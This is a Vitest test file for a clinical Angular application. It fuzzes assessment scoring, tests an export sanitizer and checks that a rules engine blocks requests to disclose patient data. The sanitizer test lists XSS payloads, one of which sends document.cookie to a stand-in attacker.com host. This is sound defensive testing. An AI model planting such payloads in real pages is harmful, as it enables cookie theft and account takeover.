import '@angular/compiler';
import { expect } from 'vitest';
import { ALL_ASSESSMENTS, getAssessment } from '../../src/services/clinical-assessments/assessment-registry';
import { AssessmentType } from '../../src/services/clinical-assessments/types';
import { ExportService } from '../../src/services/export.service';
import { RulesEngineService } from '../../src/services/rules-engine.service';

describe('Deep Clinical Fuzzing & Mutation Testing Suite', () => {
  const exportService = new ExportService();
  const rulesEngine = new RulesEngineService();

  // 1. Comprehensive Fuzzing of all 17 Assessment Strategy Definitions
  describe('Clinical Assessment Instrumentation Fuzzing (10,000 Iterations)', () => {
    const assessmentTypes: AssessmentType[] = [
      'phq9', 'gad7', 'isi', 'cvsq', 'mbi', 'cssrs', 'ros14', 'phq15',
      'prapare', 'ayurveda', 'tcm', 'growthyself', 'moca', 'auditc', 'sarcf', 'dn4', 'sibi'
    ];

    it('should maintain mathematical boundedness and type safety under 10,000 random mutated input vectors', () => {
      let totalCycles = 0;

      for (const type of assessmentTypes) {
        const def = getAssessment(type);
        expect(def).toBeDefined();
        expect(def.questions.length).toBeGreaterThan(0);
        expect(def.tiers.length).toBeGreaterThan(0);

        // Fuzzing 600 cycles per assessment type = 10,200 total cycles
        for (let cycle = 0; cycle < 600; cycle++) {
          totalCycles++;
          const mutatedAnswers: Record<number, any> = {};

          for (const q of def.questions) {
            const rand = Math.random();
            if (rand < 0.1) {
              // Extreme boundary: negative or overflow
              mutatedAnswers[q.id] = Math.random() < 0.5 ? -9999 : 999999;
            } else if (rand < 0.2) {
              // Non-numeric mutations
              mutatedAnswers[q.id] = Math.random() < 0.5 ? NaN : (Math.random() < 0.5 ? null : undefined);
            } else if (rand < 0.3) {
              // Float / Non-integer mutations
              mutatedAnswers[q.id] = Math.PI * Math.random();
            } else if (rand < 0.4) {
              // Stringified numbers & XSS payload injection
              mutatedAnswers[q.id] = Math.random() < 0.5 ? '2' : '<script>alert(1)</script>';
            } else {
              // Standard in-range randomized Likert choice
              const validOption = q.options[Math.floor(Math.random() * q.options.length)];
              mutatedAnswers[q.id] = validOption ? validOption.value : 0;
            }
          }

          // 1. Invariant: calculateScore must return a valid number and never crash
          const score = def.calculateScore(mutatedAnswers);
          expect(typeof score).toBe('number');
          expect(isNaN(score)).toBe(false);

          // 2. Invariant: Tier lookup must always resolve to a valid severity tier
          const tier = def.tiers.find(t => score >= t.min && score <= t.max) || def.tiers[0];
          expect(tier).toBeDefined();
          expect(tier.label).toBeTruthy();
          expect(tier.recommendation).toBeTruthy();

          // 3. Invariant: Subscale breakdown calculation (if present) must return defined metrics
          if (def.calculateBreakdown) {
            const breakdown = def.calculateBreakdown(mutatedAnswers);
            expect(breakdown).toBeDefined();
            for (const key of Object.keys(breakdown)) {
              const val = (breakdown as any)[key];
              expect(typeof val === 'number' || typeof val === 'string').toBe(true);
              if (typeof val === 'number') {
                expect(isNaN(val)).toBe(false);
              }
            }
          }

          // 4. Invariant: 3D Anatomical part mapping must safely handle arbitrary values
          if (def.mapToAnatomyPart) {
            const part = def.mapToAnatomyPart(1, mutatedAnswers[1]);
            expect(part === null || typeof part === 'string').toBe(true);
          }
        }
      }

      expect(totalCycles).toBeGreaterThanOrEqual(10000);
    });
  });

  // 2. Deep FHIR R4 Bundle Sanitization & Mutation Fuzzing (5,000 Iterations)
  describe('FHIR R4 Bundle Deep Sanitization & Mutation Fuzzing (5,000 Iterations)', () => {
    const xssPayloads = [
      '<script>alert("HIPAA_BREACH")</script>',
      '<img src="invalid" onerror="fetch(\'http://attacker.com/steal?token=\'+document.cookie)">',
      '<svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><script src=data:text/javascript,alert(1)></script>',
      '<<SCRIPT>alert("NESTED");//<</SCRIPT>'
    ];

    it('should neutralize 100% of malicious script vectors across 5,000 mutated clinical input streams', () => {
      for (let i = 0; i < 5000; i++) {
        const payload = xssPayloads[i % xssPayloads.length];
        const mutatedPrefix = `Patient Demographics (DOB 1980-01-01) — Symptom Vector ${i}: `;
        const dirtyInput = `${mutatedPrefix}${payload} <div class="safe-clinical-badge">Normal Sinus Rhythm</div>`;

        const sanitized = exportService.sanitizeForExport(dirtyInput);

        // Security Invariants:
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).toContain('Normal Sinus Rhythm');
      }
    });
  });

  // 3. Clinical Rules Engine Guardrail Fuzzing
  describe('Clinical Rules Engine Guardrail & Modifier Fuzzing', () => {
    it('should correctly trigger guardrail block rules on PHI disclosure attempts', () => {
      const phiAttempts = [
        'Here is my social security number: 000-12-3456',
        'Can you give me my phone and my address?',
        'What is my email address registered with the clinic?'
      ];

      for (const msg of phiAttempts) {
        const block = rulesEngine.evaluateOnMessage(msg);
        expect(block).toBeDefined();
        expect(block?.reply).toBeTruthy();
      }
    });

    it('should apply modifier rules across clinical triggers', () => {
      const dischargeResponse = rulesEngine.evaluateOnResponse('Consultation complete.', 'patient is leaving');
      expect(dischargeResponse).toContain('FHIR Bundle');
    });
  });
});